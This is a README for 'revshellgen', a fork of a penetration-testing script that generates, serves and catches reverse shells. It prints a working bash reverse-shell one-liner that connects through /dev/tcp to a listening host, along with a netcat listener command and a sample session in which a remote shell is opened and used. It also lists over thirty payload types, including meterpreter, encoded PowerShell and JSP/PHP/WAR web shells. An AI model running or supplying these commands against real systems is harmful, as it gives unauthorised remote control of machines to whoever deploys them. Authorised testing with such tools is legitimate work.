# Reverse Shell Generator

Simple script to generate, server and listen for reverse shells.
This is a fork of @cwinfosec revshellgen

## Usage

```
usage: revshellgen [-h] [-i IPADDR] [-p PORT] [-t SHELL_TYPE] [-l] [-L] [-s]

revshellgen -i 127.0.0.1 -p 4444 -t bash

options:
  -h, --help            show this help message and exit
  -i IPADDR, --ipaddr IPADDR
                        IP address or interface to connect back to
  -p PORT, --port PORT  Port to connect back to
  -t SHELL_TYPE, --type SHELL_TYPE
                        Type of reverse shell to generate
  -l, --list            List available shell types
  -L, --listen          Start a listener
  -s, --serve           Serve reverse shell
```

## Features

-   Automatically copy reverse shell into your clipboard using osc52
-   Can start listeners automatically
-   Can serve files on the web and copies download command to your clipboard
-   Supports usage of interfaces and domains rather than IP addresses

```
❯  ./revshellgen -i eth0 -t bash -L
[*] Generated reverse shell
[+] Contents copied to clipboard
bash -c "bash -i >& /dev/tcp/172.17.0.2/4444 0>&1"

[*] Start listener
rlwrap -cAr nc -lvnp 4444

[+] Listening on 4444
Connection from 172.17.0.2:34572
pwnpad@test:~/shared/revshellgen[pwnpad@test revshellgen]$ ls
ls
LICENSE
README.md
revshellgen
pwnpad@test:~/shared/revshellgen[pwnpad@test revshellgen]$ Exiting.
```

### Shell Types

| Type      | Description                                        | Platform |
| --------- | -------------------------------------------------- | -------- |
| asp       | ASP stageless reverse shell                        | Windows  |
| bash      | Bash reverse shell                                 | Linux    |
| java      | Java reverse shell                                 | Linux    |
| jsp       | JSP stageless reverse shell                        | Generic  |
| lin       | Linux stageless reverse shell                      | Linux    |
| lin32     | 32-bit Linux stageless reverse shell               | Linux    |
| lin-met   | Linux stageless meterpreter reverse shell          | Linux    |
| lin32-met | 32-bit Linux stageless meterpreter reverse shell   | Linux    |
| nc        | Netcat reverse shell                               | Linux    |
| nc-mkfifo | Netcat mkfifo reverse shell                        | Linux    |
| nc-win    | Windows Netcat reverse shell                       | Windows  |
| ncat      | Ncat reverse shell                                 | Linux    |
| ncat-udp  | Ncat UDP reverse shell                             | Linux    |
| ncat-win  | Windows Ncat reverse shell                         | Windows  |
| node      | NodeJS reverse shell                               | Linux    |
| perl      | Perl reverse shell                                 | Linux    |
| perl-win  | Windows Perl reverse shell                         | Windows  |
| php       | PHP reverse shell                                  | Generic  |
| ps        | Powershell reverse shell                           | Windows  |
| ps-b64    | Encoded Powershell reverse shell                   | Windows  |
| py        | Python reverse shell                               | Linux    |
| py-win    | Windows Python reverse shell                       | Windows  |
| ruby      | Ruby reverse shell                                 | Linux    |
| ruby-win  | Ruby reverse shell                                 | Windows  |
| socat     | Socat reverse shell                                | Linux    |
| telnet    | Telnet reverse shell                               | Linux    |
| war       | War stageless reverse shell                        | Generic  |
| win       | Windows stageless reverse shell                    | Windows  |
| win32     | 32-bit Windows stageless reverse shell             | Windows  |
| win-met   | Windows stageless meterpreter reverse shell        | Windows  |
| win32-met | 32-bit Windows stageless meterpreter reverse shell | Windows  |
